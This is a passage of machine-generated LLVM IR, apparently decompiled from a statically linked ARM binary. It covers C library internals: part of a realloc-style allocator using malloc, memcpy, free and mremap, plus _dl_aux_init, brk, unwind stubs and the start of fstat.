  br label %dec_label_pc_1c1ec

dec_label_pc_1c1ec:                               ; preds = %dec_label_pc_1c1dc, %dec_label_pc_1c1e8
  %v1_1c1ec = phi i32 [ %v3_1c1d4, %dec_label_pc_1c1dc ], [ %v1_1c1ec.pre, %dec_label_pc_1c1e8 ]
  %v0_1c1ec = phi i32 [ %v3_1c1c8, %dec_label_pc_1c1dc ], [ %v0_1c1ec.pre, %dec_label_pc_1c1e8 ]
  %v2_1c1ec = add i32 %v1_1c1ec, 8
  %v3_1c1ec = inttoptr i32 %v2_1c1ec to i32*
  store i32 %v0_1c1ec, i32* %v3_1c1ec, align 4
  %v0_1c1f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c1f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c1f0 = add i32 %v1_1c1f0, 12
  %v3_1c1f0 = inttoptr i32 %v2_1c1f0 to i32*
  store i32 %v0_1c1f0, i32* %v3_1c1f0, align 4
  %v1_1c2ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c2ac

dec_label_pc_1c1f8:                               ; preds = %dec_label_pc_1c168, %dec_label_pc_1c1b8, %dec_label_pc_1c1a4
  %v1_1c1f8 = add i32 %v1_1c13c, -7
  store i32 %v1_1c1f8, i32* %r0.global-to-local, align 4
  %v1_1c1fc = call i32 @malloc(i32 %v1_1c1f8)
  store i32 %v1_1c1fc, i32* @r0, align 4
  store i32 %v1_1c1fc, i32* %r1.global-to-local, align 4
  %v2_1c200 = icmp eq i32 %v1_1c1fc, 0
  br i1 %v2_1c200, label %bb31, label %dec_label_pc_1c20c

bb31:                                             ; preds = %dec_label_pc_1c1f8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c20c:                               ; preds = %dec_label_pc_1c1f8
  %v1_1c214.pre = load i32, i32* @r4, align 4
  %v1_1c20c = add i32 %v1_1c1fc, -4
  %v2_1c20c = inttoptr i32 %v1_1c20c to i32*
  %v3_1c20c = load i32, i32* %v2_1c20c, align 4
  store i32 %v3_1c20c, i32* @r3, align 4
  %v1_1c210 = add i32 %v1_1c1fc, -8
  store i32 %v1_1c210, i32* @r7, align 4
  %v9_1c214 = icmp eq i32 %v1_1c210, %v1_1c214.pre
  br i1 %v9_1c214, label %.thread2, label %dec_label_pc_1c224

.thread2:                                         ; preds = %dec_label_pc_1c20c
  %v2_1c218 = and i32 %v3_1c20c, -4
  store i32 %v2_1c218, i32* %r3.global-to-local, align 4
  %v2_1c21c = load i32, i32* @r6, align 4
  %v3_1c21c = add i32 %v2_1c21c, %v2_1c218
  store i32 %v3_1c21c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c2ac

dec_label_pc_1c224:                               ; preds = %dec_label_pc_1c20c
  %v0_1c224 = load i32, i32* @r6, align 4
  %v1_1c224 = add i32 %v0_1c224, -4
  store i32 %v1_1c224, i32* @r2, align 4
  %v3_1c228 = udiv i32 %v1_1c224, 4
  store i32 %v3_1c228, i32* @ip, align 4
  %tmp37 = and i32 %v1_1c224, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1c230 = icmp ult i32 %v1_1c224, 36
  %v3_1c230 = or i1 %tmp38, %v2_1c230
  %v0_1c240 = load i32, i32* @r5, align 4
  br i1 %v3_1c230, label %dec_label_pc_1c240, label %dec_label_pc_1c234

dec_label_pc_1c234:                               ; preds = %dec_label_pc_1c224
  store i32 %v0_1c240, i32* @r1, align 4
  %v0_1c238 = call i32 @memcpy()
  store i32 %v0_1c238, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1c240:                               ; preds = %dec_label_pc_1c224
  %v1_1c240 = inttoptr i32 %v0_1c240 to i32*
  %v2_1c240 = load i32, i32* %v1_1c240, align 4
  store i32 %v2_1c240, i32* %r3.global-to-local, align 4
  %v2_1c244 = inttoptr i32 %v1_1c1fc to i32*
  store i32 %v2_1c240, i32* %v2_1c244, align 4
  %v0_1c248 = load i32, i32* @r5, align 4
  %v1_1c248 = add i32 %v0_1c248, 4
  %v2_1c248 = inttoptr i32 %v1_1c248 to i32*
  %v3_1c248 = load i32, i32* %v2_1c248, align 4
  store i32 %v3_1c248, i32* %r3.global-to-local, align 4
  %v1_1c24c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c24c = add i32 %v1_1c24c, 4
  %v3_1c24c = inttoptr i32 %v2_1c24c to i32*
  store i32 %v3_1c248, i32* %v3_1c24c, align 4
  %v0_1c250 = load i32, i32* @r5, align 4
  %v1_1c250 = add i32 %v0_1c250, 8
  %v2_1c250 = inttoptr i32 %v1_1c250 to i32*
  %v3_1c250 = load i32, i32* %v2_1c250, align 4
  store i32 %v3_1c250, i32* %r3.global-to-local, align 4
  %v0_1c254 = load i32, i32* @ip, align 4
  %v1_1c258 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c258 = add i32 %v1_1c258, 8
  %v3_1c258 = inttoptr i32 %v2_1c258 to i32*
  store i32 %v3_1c250, i32* %v3_1c258, align 4
  %tmp39 = icmp ult i32 %v0_1c254, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1c260

dec_label_pc_1c260:                               ; preds = %dec_label_pc_1c240
  %v0_1c260 = load i32, i32* @r5, align 4
  %v1_1c260 = add i32 %v0_1c260, 12
  %v2_1c260 = inttoptr i32 %v1_1c260 to i32*
  %v3_1c260 = load i32, i32* %v2_1c260, align 4
  store i32 %v3_1c260, i32* %r3.global-to-local, align 4
  %v1_1c264 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c264 = add i32 %v1_1c264, 12
  %v3_1c264 = inttoptr i32 %v2_1c264 to i32*
  store i32 %v3_1c260, i32* %v3_1c264, align 4
  %v0_1c268 = load i32, i32* @r5, align 4
  %v1_1c268 = add i32 %v0_1c268, 16
  %v2_1c268 = inttoptr i32 %v1_1c268 to i32*
  %v3_1c268 = load i32, i32* %v2_1c268, align 4
  store i32 %v3_1c268, i32* %r3.global-to-local, align 4
  %v0_1c26c = load i32, i32* @ip, align 4
  %v1_1c270 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c270 = add i32 %v1_1c270, 16
  %v3_1c270 = inttoptr i32 %v2_1c270 to i32*
  store i32 %v3_1c268, i32* %v3_1c270, align 4
  %tmp40 = icmp ult i32 %v0_1c26c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1c278

dec_label_pc_1c278:                               ; preds = %dec_label_pc_1c260
  %v0_1c278 = load i32, i32* @r5, align 4
  %v1_1c278 = add i32 %v0_1c278, 20
  %v2_1c278 = inttoptr i32 %v1_1c278 to i32*
  %v3_1c278 = load i32, i32* %v2_1c278, align 4
  store i32 %v3_1c278, i32* %r3.global-to-local, align 4
  %v1_1c27c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c27c = add i32 %v1_1c27c, 20
  %v3_1c27c = inttoptr i32 %v2_1c27c to i32*
  store i32 %v3_1c278, i32* %v3_1c27c, align 4
  %v0_1c280 = load i32, i32* @r5, align 4
  %v1_1c280 = add i32 %v0_1c280, 24
  %v2_1c280 = inttoptr i32 %v1_1c280 to i32*
  %v3_1c280 = load i32, i32* %v2_1c280, align 4
  store i32 %v3_1c280, i32* %r3.global-to-local, align 4
  %v1_1c284 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c284 = add i32 %v1_1c284, 24
  %v3_1c284 = inttoptr i32 %v2_1c284 to i32*
  store i32 %v3_1c280, i32* %v3_1c284, align 4
  %v0_1c288 = load i32, i32* @ip, align 4
  %v7_1c288 = icmp eq i32 %v0_1c288, 9
  br i1 %v7_1c288, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1c278
  %v1_1c28c = load i32, i32* @r5, align 4
  %v2_1c28c = add i32 %v1_1c28c, 28
  %v3_1c28c = inttoptr i32 %v2_1c28c to i32*
  %v4_1c28c = load i32, i32* %v3_1c28c, align 4
  store i32 %v4_1c28c, i32* %r3.global-to-local, align 4
  %v2_1c290 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c290 = add i32 %v2_1c290, 28
  %v4_1c290 = inttoptr i32 %v3_1c290 to i32*
  store i32 %v4_1c28c, i32* %v4_1c290, align 4
  %v1_1c294 = load i32, i32* @r5, align 4
  %v2_1c294 = add i32 %v1_1c294, 32
  %v3_1c294 = inttoptr i32 %v2_1c294 to i32*
  %v4_1c294 = load i32, i32* %v3_1c294, align 4
  store i32 %v4_1c294, i32* %r3.global-to-local, align 4
  %v2_1c298 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c298 = add i32 %v2_1c298, 32
  %v4_1c298 = inttoptr i32 %v3_1c298 to i32*
  store i32 %v4_1c294, i32* %v4_1c298, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1c278, %dec_label_pc_1c260, %dec_label_pc_1c240, %dec_label_pc_1c234, %bb32
  %v0_1c29c = load i32, i32* @r5, align 4
  store i32 %v0_1c29c, i32* @r0, align 4
  %v0_1c2a0 = call i32 @free()
  store i32 %v0_1c2a0, i32* %r0.global-to-local, align 4
  %v0_1c2a4 = load i32, i32* @r7, align 4
  %v1_1c2a4 = add i32 %v0_1c2a4, 8
  store i32 %v1_1c2a4, i32* @r4, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c2ac:                               ; preds = %bb30, %.thread2, %dec_label_pc_1c1ec
  %v0_1c2c0 = phi i32 [ %v3_1c21c, %.thread2 ], [ %v1_1c134, %bb30 ], [ %v1_1c2ac.pre, %dec_label_pc_1c1ec ]
  %v0_1c2ac = load i32, i32* @sb, align 4
  %v2_1c2ac = sub i32 %v0_1c2c0, %v0_1c2ac
  store i32 %v2_1c2ac, i32* %r1.global-to-local, align 4
  %v0_1c2b4 = load i32, i32* @sl, align 4
  %v1_1c2b4 = add i32 %v0_1c2b4, 4
  %v2_1c2b4 = inttoptr i32 %v1_1c2b4 to i32*
  %v3_1c2b4 = load i32, i32* %v2_1c2b4, align 4
  %tmp41 = icmp ugt i32 %v2_1c2ac, 15
  %v1_1c2dc = urem i32 %v3_1c2b4, 2
  store i32 %v1_1c2dc, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1c2dc, label %dec_label_pc_1c2bc

dec_label_pc_1c2bc:                               ; preds = %dec_label_pc_1c2ac
  %v2_1c2c0 = or i32 %v1_1c2dc, %v0_1c2c0
  store i32 %v2_1c2c0, i32* %r3.global-to-local, align 4
  store i32 %v2_1c2c0, i32* %v2_1c2b4, align 4
  %v0_1c2c8 = load i32, i32* @sl, align 4
  %v1_1c2c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c2c8 = add i32 %v1_1c2c8, %v0_1c2c8
  store i32 %v2_1c2c8, i32* %r2.global-to-local, align 4
  %v1_1c2cc = add i32 %v2_1c2c8, 4
  %v2_1c2cc = inttoptr i32 %v1_1c2cc to i32*
  %v3_1c2cc = load i32, i32* %v2_1c2cc, align 4
  %v1_1c2d0 = or i32 %v3_1c2cc, 1
  store i32 %v1_1c2d0, i32* %r3.global-to-local, align 4
  store i32 %v1_1c2d0, i32* %v2_1c2cc, align 4
  br label %dec_label_pc_1c30c

dec_label_pc_1c2dc:                               ; preds = %dec_label_pc_1c2ac
  %v2_1c2e0 = add i32 %v0_1c2b4, %v0_1c2ac
  store i32 %v2_1c2e0, i32* %r0.global-to-local, align 4
  %v2_1c2e4 = or i32 %v1_1c2dc, %v0_1c2ac
  store i32 %v2_1c2e4, i32* %r3.global-to-local, align 4
  %v1_1c2e8 = or i32 %v2_1c2ac, 1
  store i32 %v1_1c2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_1c2e4, i32* %v2_1c2b4, align 4
  %v0_1c2f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c2f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c2f0 = add i32 %v1_1c2f0, 4
  %v3_1c2f0 = inttoptr i32 %v2_1c2f0 to i32*
  store i32 %v0_1c2f0, i32* %v3_1c2f0, align 4
  %v0_1c2f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c2f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2f4 = add i32 %v1_1c2f4, %v0_1c2f4
  store i32 %v2_1c2f4, i32* %r2.global-to-local, align 4
  %v1_1c2f8 = add i32 %v2_1c2f4, 4
  %v2_1c2f8 = inttoptr i32 %v1_1c2f8 to i32*
  %v3_1c2f8 = load i32, i32* %v2_1c2f8, align 4
  %v1_1c2fc = or i32 %v3_1c2f8, 1
  store i32 %v1_1c2fc, i32* %r3.global-to-local, align 4
  store i32 %v1_1c2fc, i32* %v2_1c2f8, align 4
  %v0_1c304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c304 = add i32 %v0_1c304, 8
  store i32 %v1_1c304, i32* @r0, align 4
  %v0_1c308 = call i32 @free()
  store i32 %v0_1c308, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c30c

dec_label_pc_1c30c:                               ; preds = %dec_label_pc_1c2bc, %dec_label_pc_1c2dc
  %v0_1c30c = load i32, i32* @sl, align 4
  %v1_1c30c = add i32 %v0_1c30c, 8
  store i32 %v1_1c30c, i32* @r4, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c314:                               ; preds = %bb29
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_1c31c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_1c31c, i32* @r8, align 4
  %v2_1c320 = inttoptr i32 %v1_1c130 to i32*
  %v3_1c320 = load i32, i32* %v2_1c320, align 4
  store i32 %v3_1c320, i32* @r4, align 4
  %v1_1c324 = add i32 %v4_1c31c, 860
  %v2_1c324 = inttoptr i32 %v1_1c324 to i32*
  %v3_1c324 = load i32, i32* %v2_1c324, align 4
  %v1_1c328 = add i32 %v3_1c320, 4
  %v1_1c32c = add i32 %v3_1c324, -1
  store i32 %v1_1c32c, i32* %r2.global-to-local, align 4
  %v2_1c330 = add i32 %v1_1c328, %v1_1c32c
  %v1_1c334 = load i32, i32* @sb, align 4
  %v2_1c334 = add i32 %v2_1c330, %v1_1c334
  store i32 %v2_1c334, i32* %r3.global-to-local, align 4
  %v2_1c338 = sub i32 0, %v3_1c324
  %v3_1c338 = and i32 %v2_1c334, %v2_1c338
  store i32 %v3_1c338, i32* @r7, align 4
  %v2_1c33c = sub i32 %v3_1c338, %v3_1c320
  store i32 %v2_1c33c, i32* @fp, align 4
  %v9_1c340 = icmp eq i32 %v1_1c134, %v2_1c33c
  br i1 %v9_1c340, label %dec_label_pc_1c3b4, label %dec_label_pc_1c348

dec_label_pc_1c348:                               ; preds = %dec_label_pc_1c314
  %v2_1c348 = sub i32 %v1_1c130, %v3_1c320
  store i32 %v2_1c348, i32* %r0.global-to-local, align 4
  %v2_1c34c = add i32 %v3_1c320, %v1_1c134
  store i32 %v2_1c34c, i32* %r1.global-to-local, align 4
  store i32 %v3_1c338, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1c358 = call i32 @mremap(i32 %v2_1c348, i32 %v2_1c34c, i32 %v3_1c338, i32 1)
  store i32 %v4_1c358, i32* %r0.global-to-local, align 4
  %v7_1c35c = icmp eq i32 %v4_1c358, -1
  br i1 %v7_1c35c, label %dec_label_pc_1c3a8, label %dec_label_pc_1c364

dec_label_pc_1c364:                               ; preds = %dec_label_pc_1c348
  %v1_1c364 = load i32, i32* @r4, align 4
  %v2_1c364 = add i32 %v1_1c364, %v4_1c358
  store i32 %v2_1c364, i32* %r0.global-to-local, align 4
  %v0_1c368 = load i32, i32* @fp, align 4
  %v1_1c368 = or i32 %v0_1c368, 2
  store i32 %v1_1c368, i32* %r3.global-to-local, align 4
  %v2_1c36c = add i32 %v2_1c364, 4
  %v3_1c36c = inttoptr i32 %v2_1c36c to i32*
  store i32 %v1_1c368, i32* %v3_1c36c, align 4
  %v0_1c370 = load i32, i32* @r8, align 4
  %v1_1c370 = add i32 %v0_1c370, 868
  %v2_1c370 = inttoptr i32 %v1_1c370 to i32*
  %v3_1c370 = load i32, i32* %v2_1c370, align 4
  store i32 %v3_1c370, i32* %r3.global-to-local, align 4
  %v1_1c374 = add i32 %v0_1c370, 880
  %v2_1c374 = inttoptr i32 %v1_1c374 to i32*
  %v3_1c374 = load i32, i32* %v2_1c374, align 4
  store i32 %v3_1c374, i32* %r2.global-to-local, align 4
  %v0_1c378 = load i32, i32* @r6, align 4
  %v2_1c378 = sub i32 %v3_1c370, %v0_1c378
  store i32 %v2_1c378, i32* %r3.global-to-local, align 4
  %v1_1c37c = load i32, i32* @r7, align 4
  %v2_1c37c = add i32 %v1_1c37c, %v2_1c378
  store i32 %v2_1c37c, i32* %r1.global-to-local, align 4
  %v1_1c380 = add i32 %v0_1c370, 872
  %v2_1c380 = inttoptr i32 %v1_1c380 to i32*
  %v3_1c380 = load i32, i32* %v2_1c380, align 4
  store i32 %v3_1c380, i32* %r3.global-to-local, align 4
  %v1_1c388 = add i32 %v0_1c370, 884
  %v2_1c388 = inttoptr i32 %v1_1c388 to i32*
  %v3_1c388 = load i32, i32* %v2_1c388, align 4
  store i32 %v3_1c388, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1c37c, %v3_1c374
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_1c364
  store i32 %v2_1c37c, i32* %v2_1c374, align 4
  %v0_1c390.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1c390.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1c364, %bb33
  %v1_1c390 = phi i32 [ %v0_1c370, %dec_label_pc_1c364 ], [ %v1_1c390.pre, %bb33 ]
  %v0_1c390 = phi i32 [ %v2_1c37c, %dec_label_pc_1c364 ], [ %v0_1c390.pre, %bb33 ]
  %v2_1c390 = add i32 %v1_1c390, 868
  %v3_1c390 = inttoptr i32 %v2_1c390 to i32*
  store i32 %v0_1c390, i32* %v3_1c390, align 4
  %v0_1c394 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c394 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c394 = add i32 %v1_1c394, %v0_1c394
  store i32 %v2_1c394, i32* %r1.global-to-local, align 4
  %v1_1c398 = load i32, i32* %r2.global-to-local, align 4
  %v0_1c39c = load i32, i32* %r0.global-to-local, align 4
  %v1_1c39c = add i32 %v0_1c39c, 8
  store i32 %v1_1c39c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_1c394, %v1_1c398
  br i1 %tmp43, label %bb35, label %dec_label_pc_1c3e0

bb35:                                             ; preds = %bb34
  %v5_1c3a0 = load i32, i32* @r8, align 4
  %v6_1c3a0 = add i32 %v5_1c3a0, 884
  %v7_1c3a0 = inttoptr i32 %v6_1c3a0 to i32*
  store i32 %v2_1c394, i32* %v7_1c3a0, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c3a8:                               ; preds = %dec_label_pc_1c348
  %v0_1c3a8 = load i32, i32* @sb, align 4
  %v1_1c3a8 = add i32 %v0_1c3a8, 4
  store i32 %v1_1c3a8, i32* %r3.global-to-local, align 4
  %v0_1c3ac = load i32, i32* @r6, align 4
  %v3_1c3ac = icmp ult i32 %v0_1c3ac, %v1_1c3a8
  br i1 %v3_1c3ac, label %dec_label_pc_1c3bc, label %dec_label_pc_1c3a8.dec_label_pc_1c3b4_crit_edge

dec_label_pc_1c3a8.dec_label_pc_1c3b4_crit_edge:  ; preds = %dec_label_pc_1c3a8
  %v0_1c3b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c3b4

dec_label_pc_1c3b4:                               ; preds = %dec_label_pc_1c3a8.dec_label_pc_1c3b4_crit_edge, %dec_label_pc_1c314
  %v0_1c3b4 = phi i32 [ %v0_1c3b4.pre, %dec_label_pc_1c3a8.dec_label_pc_1c3b4_crit_edge ], [ %v0_1c11c, %dec_label_pc_1c314 ]
  store i32 %v0_1c3b4, i32* @r4, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c3bc:                               ; preds = %dec_label_pc_1c3a8
  %v1_1c3bc = add i32 %v0_1c3a8, -7
  store i32 %v1_1c3bc, i32* %r0.global-to-local, align 4
  %v1_1c3c0 = call i32 @malloc(i32 %v1_1c3bc)
  store i32 %v1_1c3c0, i32* @r0, align 4
  store i32 %v1_1c3c0, i32* @r4, align 4
  %v2_1c3c4 = icmp eq i32 %v1_1c3c0, 0
  br i1 %v2_1c3c4, label %dec_label_pc_1c3e0, label %dec_label_pc_1c3cc

dec_label_pc_1c3cc:                               ; preds = %dec_label_pc_1c3bc
  %v0_1c3cc = load i32, i32* @r6, align 4
  %v1_1c3cc = add i32 %v0_1c3cc, -8
  store i32 %v1_1c3cc, i32* @r2, align 4
  %v0_1c3d0 = load i32, i32* @r5, align 4
  store i32 %v0_1c3d0, i32* @r1, align 4
  %v0_1c3d4 = call i32 @memcpy()
  %v0_1c3d8 = load i32, i32* @r5, align 4
  store i32 %v0_1c3d8, i32* @r0, align 4
  %v0_1c3dc = call i32 @free()
  store i32 %v0_1c3dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c3e0:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1c3bc, %dec_label_pc_1c3b4, %dec_label_pc_1c30c, %.thread6, %dec_label_pc_1c17c, %dec_label_pc_1c3cc
  store i32 %v2_1c0d0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  %v4_1c3f0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 28) to i32*), align 4
  store i32 %v4_1c3f0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1c3f0)
  br label %dec_label_pc_1c3fc

dec_label_pc_1c3fc:                               ; preds = %dec_label_pc_1c104, %dec_label_pc_1c0ac, %dec_label_pc_1c094, %dec_label_pc_1c3e0
  %v0_1c3fc = load i32, i32* @r4, align 4
  store i32 %v0_1c3fc, i32* %r0.global-to-local, align 4
  store i32 %v3_1c074, i32* @r4, align 4
  store i32 %v6_1c074, i32* @r5, align 4
  store i32 %v9_1c074, i32* @r6, align 4
  store i32 %v12_1c074, i32* @r7, align 4
  store i32 %v15_1c074, i32* @r8, align 4
  store i32 %v18_1c074, i32* @sb, align 4
  store i32 %v21_1c074, i32* @sl, align 4
  store i32 %v24_1c074, i32* @fp, align 4
  store i32 %v27_1c074, i32* @lr, align 4
  ret i32 %v0_1c3fc

; uselistorder directives
  uselistorder i32 %v2_1c394, { 1, 0, 2 }
  uselistorder i32 %v2_1c37c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c358, { 1, 0, 2 }
  uselistorder i32 %v3_1c338, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c2dc, { 2, 1, 0 }
  uselistorder i32 %v2_1c2ac, { 1, 0, 2 }
  uselistorder i32 %v0_1c240, { 1, 0 }
  uselistorder i32 %v1_1c1fc, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1c160, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1c158, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1c13c, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1c134, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1c130, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1c120, { 1, 0 }
  uselistorder i32 %v0_1c11c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1c0fc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 860, { 4, 6, 5, 7, 1, 2, 0, 3 }
  uselistorder i32 ()* @abort, { 6, 2, 1, 5, 4, 3, 0 }
  uselistorder i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), { 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), { 10, 11, 12, 9, 13, 0, 3, 4, 5, 6, 2, 1, 14, 7, 17, 15, 16, 43, 44, 21, 22, 23, 24, 25, 20, 26, 19, 27, 30, 29, 28, 32, 31, 33, 40, 37, 36, 35, 34, 39, 38, 18, 42, 41, 45, 46, 47, 48, 49, 56, 52, 53, 55, 51, 8, 54, 50 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1c3fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c3e0, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1c30c, { 1, 0 }
  uselistorder label %dec_label_pc_1c2ac, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1c1f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1c1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1c1e8, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1c410(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c410:
  %v0_1c410 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c410, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1c410
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1c410, %bb
  %v10_1c424 = phi i32 [ %arg1, %dec_label_pc_1c410 ], [ 0, %bb ]
  ret i32 %v10_1c424

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r2.global-to-local, align 4
  %v4_1c434 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 112) to i32*), align 4
  %v4_1c43c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 72) to i32*), align 4
  store i32 %v4_1c43c, i32* %r1.global-to-local, align 4
  %v1_1c440 = add i32 %arg1, 44
  %v2_1c440 = inttoptr i32 %v1_1c440 to i32*
  %v3_1c440 = load i32, i32* %v2_1c440, align 4
  %v1_1c444 = add i32 %arg1, 28
  %v2_1c444 = inttoptr i32 %v1_1c444 to i32*
  %v3_1c444 = load i32, i32* %v2_1c444, align 4
  store i32 %v3_1c444, i32* %r2.global-to-local, align 4
  %v2_1c448 = inttoptr i32 %v4_1c434 to i32*
  store i32 %v3_1c440, i32* %v2_1c448, align 4
  %v0_1c44c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c44c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c44c = inttoptr i32 %v1_1c44c to i32*
  store i32 %v0_1c44c, i32* %v2_1c44c, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 112, { 2, 3, 6, 0, 7, 4, 1, 8, 5 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1c458(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c458:
  %v0_1c458 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c458, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c458
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c458, %bb
  %v4_1c45c = phi i32 [ %arg1, %dec_label_pc_1c458 ], [ 0, %bb ]
  ret i32 %v4_1c45c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c49c:
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 26312) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_1c4ac = load i32, i32* @r0, align 4
  ret i32 %v1_1c4ac
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_1c4b0 = load i32, i32* @r0, align 4
  ret i32 %v1_1c4b0
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_1c4b4 = load i32, i32* @r0, align 4
  ret i32 %v1_1c4b4
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1c4c0 = load i32, i32* @r1, align 4
